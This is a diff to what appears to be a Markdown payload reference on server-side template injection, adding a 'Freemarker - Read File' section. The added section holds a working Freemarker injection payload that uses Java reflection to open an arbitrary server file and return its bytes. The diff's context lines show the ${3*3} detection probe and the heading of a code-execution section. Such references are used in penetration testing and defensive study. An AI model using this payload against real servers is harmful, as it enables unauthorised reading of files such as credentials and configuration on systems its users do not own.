@@ -155,6 +155,13 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 The template can be `${3*3}` or the legacy `#{3*3}`.
 
+### Freemarker - Read File
+
+```js
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
+Convert the returned bytes to ASCII
+```
+
 ### Freemarker - Code execution
 
 ```js
